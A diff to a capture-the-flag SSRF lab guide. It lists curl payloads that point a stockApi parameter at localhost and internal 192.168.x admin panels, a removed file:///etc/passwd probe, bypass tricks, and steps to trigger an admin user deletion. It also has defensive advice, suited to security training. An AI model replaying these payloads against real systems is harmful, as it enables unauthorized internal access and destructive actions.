-  "chained_vulnerabilities": ["SSRF", "Admin Panel Exposure"],
-  "sensitive_data": "Configuration, API keys, internal IPs",
-  "flag_format": "FLAG!lab4_2_[hash]"
+  "objective": "Blind internal host discovery",
+  "working_probe": "http://192.168.0.X:8080/admin",
+  "successful_signal": "Single host returns 200 + admin HTML",
+  "result": "Delete action executed on discovered host"
 }
 ```
 
@@ -702,94 +519,90 @@ The response should contain a flag string. Extract and submit it.
 
 ### Server-Side Request Forgery (SSRF)
 ```
-Attacker → Web Server → Attacker's Payload
-            (makes request to)
-            Internal Network
+Attacker input
+  -> vulnerable stockApi sink
+  -> server-side request to internal destination
+  -> internal admin response returned to attacker
 ```
 
-**Why it works:**
-- Server trusts its own network (localhost/internal IPs)
-- No validation on redirect destinations
-- URL parameters passed directly to HTTP library
+**Why it works in this module:**
+- User input directly controls destination URL
+- Internal trust boundaries are assumed, not enforced
+- Admin endpoints rely on network location rather than robust authorization
 
-### Common SSRF Bypasses:
-1. **Localhost variations**: `localhost`, `127.0.0.1`, `0.0.0.0`, `::1`
-2. **URL encoding**: `127%2e0%2e0%2e1`, `http%3A%2F%2F`
-3. **IP math**: `2130706433` (decimal for `127.0.0.1`)
-4. **Domain redirects**: `attacker.com` redirects to `localhost`
+### Blind SSRF Discovery (Lab 4.2)
+1. Probe candidate internal hosts
+2. Use response status/content as discovery oracle
+3. Replay privileged action once valid host is identified
 
 ### Defense (What You Should Learn)
-- ✅ Whitelist allowed URLs/domains
-- ✅ Validate and sanitize all URL parameters
-- ✅ Implement network segmentation
-- ✅ Disable HTTP redirects following
-- ✅ Use private IP blocklists
-- ✅ Implement rate limiting on internal APIs
-- ✅ Log all server-side request activity
+- ✅ Strict allowlist for outbound request destinations
+- ✅ Block loopback and private address ranges in user-driven requests
+- ✅ Separate stock-check service from admin network
+- ✅ Enforce authz on admin actions independent of source network
+- ✅ Add SSRF-specific logging and anomaly detection
 
 ---
 
 ## Tools Recommended
 
 ### Intercept & Tamper
-- Burp Suite (Intruder tab for fuzzing)
+- Burp Suite (Repeater + Intruder)
 - OWASP ZAP
-- Fiddler
+- Any HTTP proxy with request editing
 
 ### Testing
 ```bash
-# Manual curl testing
-curl "http://target/api/check-stock?supplier_url=http://localhost/admin"
+# Lab 4.1 style replay
+curl -X POST http://target/lab4/1/a/stock \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "stockApi=http://localhost/admin"
 
-# Test different schemes
-curl "http://target/api?url=http://127.0.0.1:8080"
-curl "http://target/api?url=file:///etc/passwd"
+# Lab 4.2 style replay
+curl -X POST http://target/lab4/2/a/stock \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "stockApi=http://192.168.0.10:8080/admin"
 ```
-
-### URL Encoding Tools
-- Burp Suite Decoder
-- Command line: `python3 -c "import urllib.parse; print(urllib.parse.quote('http://localhost'))"`
 
 ---
 
 ## Flag Submission Checklist
 
-- [ ] Identified the vulnerable parameter (`supplier_url`)
-- [ ] Successfully accessed `http://localhost/admin` via SSRF
-- [ ] Found the admin delete endpoint structure
-- [ ] Extracted user "carlos" delete operation
-- [ ] Received flag in response
-- [ ] Submitted flag to platform
+- [ ] Identified vulnerable `stockApi` parameter
+- [ ] Executed variant-specific SSRF path
+- [ ] Reached admin endpoint (`/admin`)
+- [ ] Triggered delete action (`/admin/delete?username=carlos`)
+- [ ] Captured flag for each sub-lab variant
+- [ ] Documented exact payload and route used
 
 ---
 
 ## Real-World Impact
 
 **If this vulnerability were not caught:**
-- Attackers could delete arbitrary user accounts
-- Admin operations could be performed without authentication
-- Internal API credentials could be exposed
-- Full compromise of admin functions
-- Potential data breach through metadata access
+- Internal admin panels could be reached from public workflows
+- Privileged actions could be executed without direct admin access
+- Private network services could be mapped and abused
+- Security boundaries between frontend and internal management plane would collapse
 
 ---
 
 ## Key Takeaways
 
-1. **Never trust server-side requests** to internal networks without validation
-2. **URL parameters are attacks surfaces** - treat them with suspicion
-3. **Internal services need protection** - don't assume they're safe behind NAT
-4. **SSRF is a gateway vulnerability** - it enables further exploitation
-5. **Network segmentation is critical** - isolate sensitive services
+1. **Module 4.1 is a localhost admin pivot lab** across three themes
+2. **Module 4.2 is a blind private-host discovery lab** across three themes
+3. **Sub-lab themes matter for documentation and reporting context** (Retail, Cloud, Logistics)
+4. **Correct delete parameter is `username=carlos`** in current implementation
+5. **SSRF can convert normal stock checks into internal admin action channels**
 
 ---
 
 ## Related Security Concepts
 
 - **CWE-918**: Server-Side Request Forgery (SSRF)
-- **OWASP**: A04:2021 Insecure Design (related to API design)
-- **CVE patterns**: Many cloud infrastructure breaches start with SSRF
+- **OWASP Top 10 A10:2021**: Server-Side Request Forgery
+- **Zero Trust Networking**: Do not trust source location alone for admin actions
 
 ---
 
-**Good luck! Document your findings for the security team review.**
+**Document findings per sub-lab with: variant theme, route used, payload chain, response evidence, and captured flag.**
